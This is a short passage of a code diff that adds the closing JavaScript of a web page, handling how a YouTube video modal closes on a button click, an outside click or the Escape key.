+            youtubePlayer.src = '';
+        };
+
+        closeBtn.addEventListener('click', closeVideo);
+
+        // Close modal when clicking outside the popup frame
+        videoModal.addEventListener('click', (e) => {
+            if (e.target === videoModal) {
+                closeVideo();
+            }
+        });
+
+        // Close on ESC key press
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'Escape' && videoModal.classList.contains('active')) {
+                closeVideo();
+            }
+        });
+    </script>
+</body>
+</html>
